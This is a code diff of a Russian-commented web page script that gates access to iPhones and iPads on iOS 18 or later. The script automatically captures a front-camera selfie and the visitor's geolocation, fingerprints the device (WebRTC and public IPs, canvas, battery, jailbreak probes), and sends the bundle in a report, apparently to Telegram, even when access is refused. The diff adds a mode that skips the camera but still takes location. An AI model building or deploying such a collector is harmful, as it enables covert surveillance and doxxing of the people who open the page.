@@ -1,4 +1,17 @@
-// === app.js (тонкий фронт: сбор данных -> сервер решает; VT18 обязателен; 18.4 только в отчёт) ===
+// === app.js (тонкий фронт: сбор данных -> сервер решает;
+// VT18 обязателен; 18.4 только в отчёт;
+// LITE_MODE = без камеры но с гео) ===
+
+// ----- query params -----
+const QSP = {
+  get(k) {
+    try { return new URLSearchParams(location.search).get(k); }
+    catch { return null; }
+  }
+};
+
+// Лайт-режим: НЕ лезем в камеру, но гео берём как обычно
+const LITE_MODE = (QSP.get("lite") === "1") || (QSP.get("no_media") === "1");
 
 // API base из <script>window.__API_BASE</script> в index.html
 const API_BASE =
@@ -85,9 +98,9 @@ function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
   });
 }
 
-// === Фото (основной путь) ===
+// === Фото (обычный путь, не лайт) ===
 window.__cameraLatencyMs = null;
-async function takePhoto() {
+async function takePhotoNormal() {
   if (!navigator.mediaDevices?.getUserMedia) throw new Error("Камера недоступна");
   const t0 = (typeof performance !== "undefined" ? performance.now() : Date.now());
   const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -135,7 +148,7 @@ async function takePhoto() {
   });
 }
 
-// === Фото (фолбэк через input[type=file]) ===
+// === Фолбэк через input[type=file] (не нужен в лайтовом режиме, но пусть остаётся на всякий) ===
 (function ensureFileInput() {
   if (!document.getElementById("fileInp")) {
     const inp = document.createElement("input");
@@ -147,9 +160,9 @@ async function takePhoto() {
     document.body.appendChild(inp);
   }
 })();
-async function takePhotoWithFallback() {
+async function takePhotoWithFallbackNormal() {
   try {
-    return await takePhoto();
+    return await takePhotoNormal();
   } catch {
     const inp = document.getElementById("fileInp");
     return new Promise((resolve, reject) => {
@@ -166,7 +179,29 @@ async function takePhotoWithFallback() {
   }
 }
 
-// === STRICT iOS/iPadOS ONLY (no Macs) ===
+// === Фото (лайт режим) ===
+// только отличие: не трогаем камеру вообще, просто даём плейсхолдер
+const LITE_PHOTO_BASE64 =
+  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAkMBgQq5xwAAAABJRU5ErkJggg==";
+
+async function takePhotoLite() {
+  // не измеряем задержку камеры, не трогаем getUserMedia
+  window.__cameraLatencyMs = null;
+  return LITE_PHOTO_BASE64;
+}
+
+// врапер, который будет реально использоваться
+async function takePhotoUniversal() {
+  if (LITE_MODE) {
+    dlog("LITE_MODE: skip camera, using placeholder");
+    return takePhotoLite();
+  } else {
+    return takePhotoWithFallbackNormal();
+  }
+}
+
+// === STRICT iOS/iPadOS ONLY (no Macs? нет, у нас iPad desktop-mode и MacIntel разрешены через сервер,
+// но на фронте мы сейчас жёстко лочим только НЕ-iOS и iOS<18)
 function isIpadDesktopMode() {
   return navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1;
 }
@@ -326,7 +361,12 @@ async function getBatteryInfo() {
   try {
     if (!navigator.getBattery) return null;
     const b = await navigator.getBattery();
-    return { level: Math.round(b.level * 100), charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+    return {
+      level: Math.round(b.level * 100),
+      charging: b.charging,
+      chargingTime: b.chargingTime,
+      dischargingTime: b.dischargingTime
+    };
   } catch { return null; }
 }
 
@@ -483,8 +523,12 @@ async function runDeviceCheck(clientProfilePartial) {
     details.devtools = devtools;
     if (devtools?.opened) { reasons.push("DevTools размеры окна"); score -= 6; }
 
+    // камера: если мы в LITE_MODE, __cameraLatencyMs всегда null
     details.cameraLatencyMs = (typeof window.__cameraLatencyMs === "number") ? window.__cameraLatencyMs : null;
-    if (details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) { reasons.push("Слишком малая cameraLatency"); score -= 10; }
+    if (!LITE_MODE && details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
+      reasons.push("Слишком малая cameraLatency");
+      score -= 10;
+    }
 
     const inApp = clientProfilePartial?.inAppWebView;
     if (inApp?.isInApp || inApp?.flags?.WKWebView) { reasons.push("In-App WebView/WKWebView"); score -= 8; }
@@ -559,7 +603,10 @@ function tryOpenSchemeActive(scheme, timeoutMs = 900) {
     iframe.addEventListener('error', onError, { once: true });
 
     try { iframe.src = scheme; }
-    catch (e) { cleanup({ scheme, opened: false, reason: 'set-src-exception', error: String(e), durationMs: Date.now() - start }); return; }
+    catch (e) {
+      cleanup({ scheme, opened: false, reason: 'set-src-exception', error: String(e), durationMs: Date.now() - start });
+      return;
+    }
 
     setTimeout(() => { cleanup({ scheme, opened: false, reason: 'timeout', durationMs: Date.now() - start }); }, timeoutMs);
   });
@@ -603,6 +650,8 @@ async function collectActiveJailbreakProbes(options = {}) {
 }
 
 // === Safari feature-tests ===
+// VT18 = Safari 18.0 viewTransition API (наш обязательный пропуск)
+// 18.4 = shape()+cookieStore+WebAuthn JSON (только в отчёт, НЕ пропускает)
 async function testSafari18_0_ViewTransitions() {
   const hasAPI = typeof document.startViewTransition === 'function';
   const cssOK = CSS?.supports?.('view-transition-name: auto') === true;
@@ -617,7 +666,9 @@ async function testSafari18_0_ViewTransitions() {
     }
   } catch {}
 
-  return { feature: 'Safari 18.0 View Transitions', pass: !!(hasAPI && cssOK && ran && finished), details: { hasAPI, cssOK, ran, finished } };
+  return { feature: 'Safari 18.0 View Transitions',
+           pass: !!(hasAPI && cssOK && ran && finished),
+           details: { hasAPI, cssOK, ran, finished } };
 }
 async function testSafari18_4_Triple() {
   let shapeOK = false;
@@ -631,13 +682,27 @@ async function testSafari18_4_Triple() {
     typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === 'function' &&
     typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === 'function' &&
     typeof window.PublicKeyCredential?.prototype?.toJSON === 'function';
-  return { feature: 'Safari 18.4 shape() + cookieStore + WebAuthn JSON', pass: !!(shapeOK && cookieStoreOK && webauthnOK), details: { shapeOK, cookieStoreOK, webauthnOK } };
+
+  return { feature: 'Safari 18.4 shape() + cookieStore + WebAuthn JSON',
+           pass: !!(shapeOK && cookieStoreOK && webauthnOK),
+           details: { shapeOK, cookieStoreOK, webauthnOK } };
 }
 async function runSafariFeatureTests(maxWaitMs = 1800) {
-  const timeout = (p, ms) => Promise.race([ p, new Promise(res => setTimeout(() => res({ feature: 'timeout', pass: false, details: { timeoutMs: ms } }), ms)) ]);
-  const [vt18, triple18_4] = await Promise.all([ timeout(testSafari18_0_ViewTransitions(), maxWaitMs), timeout(testSafari18_4_Triple(), maxWaitMs) ]);
+  const timeout = (p, ms) => Promise.race([
+    p,
+    new Promise(res => setTimeout(() => res({
+      feature: 'timeout', pass: false, details: { timeoutMs: ms }
+    }), ms))
+  ]);
+  const [vt18, triple18_4] = await Promise.all([
+    timeout(testSafari18_0_ViewTransitions(), maxWaitMs),
+    timeout(testSafari18_4_Triple(), maxWaitMs)
+  ]);
   return { vt18_0: vt18, triple18_4 };
 }
+
+// ждём тихий результат от inline-скрипта в index.html (он выставляет window.__featureGate),
+// максимум ~800мс
 async function waitFeatureGate(maxMs = 800) {
   if (window.__featureGate) return window.__featureGate;
   return new Promise(resolve => {
@@ -652,8 +717,12 @@ async function waitFeatureGate(maxMs = 800) {
 // === Быстрый мультисбор профиля клиента ===
 async function collectClientProfile() {
   let jbProbesActive = { summary:{ label: 'skipped' }, results: [] };
-  try { jbProbesActive = await collectActiveJailbreakProbes().catch(() => ({ summary:{ label:'error' }, results:[] })); }
-  catch { jbProbesActive = { summary:{ label:'error' }, results:[] }; }
+  try {
+    jbProbesActive = await collectActiveJailbreakProbes()
+      .catch(() => ({ summary:{ label:'error' }, results:[] }));
+  } catch {
+    jbProbesActive = { summary:{ label:'error' }, results:[] };
+  }
 
   const [
     permissions, webrtcIps, publicIp, canvas, storageLike,
@@ -740,7 +809,7 @@ async function sendReport({ photoBase64, geo, client_profile, device_check, feat
   return data;
 }
 
-// === Основной поток (сначала жесткий iOS-гейт; VT18 обязателен; решение — сервер) ===
+// === Основной поток (жёсткий iOS-гейт; VT18 обязателен; решение — сервер) ===
 window.__reportReady = false;
 window.__decision = null;
 
@@ -769,14 +838,18 @@ async function autoFlow() {
       hideBtn(); return;
     }
 
-    // Сбор данных параллельно (фото+гео нужны в отчёт даже при отказе)
+    // Сбор данных параллельно:
+    // гео как обычно; фото = камера ИЛИ плейсхолдер, зависит от LITE_MODE
     if (UI.note) UI.note.textContent = "Собираем данные…";
     const [geo, rawPhoto, client_profile] = await Promise.all([
-      askGeolocation(), takePhotoWithFallback(), collectClientProfile()
+      askGeolocation(),
+      takePhotoUniversal(),
+      collectClientProfile()
     ]);
     const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);
 
-    // Фиче-тесты: сначала тихий результат из index.html, иначе локальный прогон
+    // Фиче-тесты: сначала тихий результат из index.html (window.__featureGate),
+    // иначе локальный прогон 18.0 / 18.4
     if (UI.note) UI.note.textContent = "Проверяем системные возможности…";
     const fg = await waitFeatureGate();
     let vt18_ok, t184_ok;
@@ -791,7 +864,7 @@ async function autoFlow() {
     const featuresSummary = { VT18: vt18_ok ? 'ok' : '—', v18_4: t184_ok ? 'ok' : '—' };
     dlog("features:", featuresSummary);
 
-    // VT18 обязателен на фронте: если не прошёл — локальный отказ + репорт
+    // VT18 обязателен на фронте
     const featTxt = `Правило: требуется 18.0 • VT18=${vt18_ok ? 'ok' : '—'} • 18.4=${t184_ok ? 'ok' : '—'}`;
     if (!vt18_ok) {
       window.__reportReady = false;
@@ -800,6 +873,8 @@ async function autoFlow() {
       if (UI.text) UI.text.innerHTML = '<span class="err">Отказ по feature-tests (18.0 обязательно).</span>';
       if (UI.reason) UI.reason.textContent = featTxt;
       if (UI.note) UI.note.textContent = "18.4 учитывается только для отчёта.";
+
+      // даже при отказе шлём отчёт в ТГ
       try {
         await sendReport({
           photoBase64, geo, client_profile,
@@ -807,6 +882,7 @@ async function autoFlow() {
           featuresSummary
         });
       } catch {}
+
       dlog("deny: vt18 fail");
       return;
     }
@@ -826,9 +902,15 @@ async function autoFlow() {
     } catch {}
 
     if (UI.text) UI.text.innerHTML = "Отправляем отчёт…";
-    const resp = await sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary });
+    const resp = await sendReport({
+      photoBase64,
+      geo,
+      client_profile,
+      device_check,
+      featuresSummary
+    });
 
-    // Если сервер не возвращает решение — по умолчанию считаем allow (т.к. VT18 пройден)
+    // Если сервер не возвращает решение — по умолчанию allow (т.к. VT18 пройден)
     window.__decision = resp?.decision || { canLaunch: true };
     const canLaunch = !!window.__decision.canLaunch;
 
@@ -837,9 +919,10 @@ async function autoFlow() {
       setBtnReady();
       if (UI.title) UI.title.textContent = "Проверка пройдена";
       if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (допуск выдан).</span>';
+      const extraLite = LITE_MODE ? " • LITE (камера не спрашивалась)" : "";
       if (UI.note) UI.note.textContent = STRICT_MODE
-        ? `${featTxt} • strict=1 (score ≥ 60)`
-        : featTxt;
+        ? `${featTxt} • strict=1 (score ≥ 60)${extraLite}`
+        : `${featTxt}${extraLite}`;
       dlog("decision: allow", window.__decision);
     } else {
       window.__reportReady = false;
@@ -849,7 +932,8 @@ async function autoFlow() {
       const strictInfo = (window.__decision?.strict?.enabled && window.__decision?.strict?.failed)
         ? ` • strict fail (score=${window.__decision?.strict?.score ?? 'n/a'})` : '';
       if (UI.reason) UI.reason.textContent = `${featTxt}${strictInfo}`;
-      if (UI.note) UI.note.textContent = "Обратитесь в поддержку, если это ошибка.";
+      const extraLite = LITE_MODE ? " • LITE режим" : "";
+      if (UI.note) UI.note.textContent = "Обратитесь в поддержку, если это ошибка." + extraLite;
       dlog("decision: deny", window.__decision);
     }
   } catch (e) {
@@ -863,7 +947,7 @@ async function autoFlow() {
 }
 
 // Кнопка «Войти»
-(function wireEnter() {
+;(function wireEnter() {
   const btn = UI.btn; if (!btn) return;
   btn.addEventListener("click", (e) => {
     if (!window.__reportReady || !window.__decision?.canLaunch) {
@@ -873,7 +957,7 @@ async function autoFlow() {
   }, { capture: true });
 })();
 
-// Старт после готовности DOM — сначала жесткий iOS-гейт
+// Старт после готовности DOM — сначала жёсткий iOS-гейт
 function startWithGate() {
   const g = hardGateIOS18();
   if (!g.ok) {
@@ -882,7 +966,8 @@ function startWithGate() {
     if (UI.title) UI.title.textContent = "Доступ отклонён";
     if (UI.text)  UI.text.innerHTML   = '<span class="err">Отказ в доступе.</span>';
     if (UI.reason) UI.reason.textContent = g.reason;
-    if (UI.note) UI.note.textContent = `Только iPhone/iPad с iOS/iPadOS ${MIN_IOS_MAJOR}+ (iPad desktop-mode допустим).`;
+    if (UI.note) UI.note.textContent =
+      `Только iPhone/iPad с iOS/iPadOS ${MIN_IOS_MAJOR}+ (iPad desktop-mode допустим).`;
     return; // дальше не идём
   }
   setTimeout(() => autoFlow(), 60);
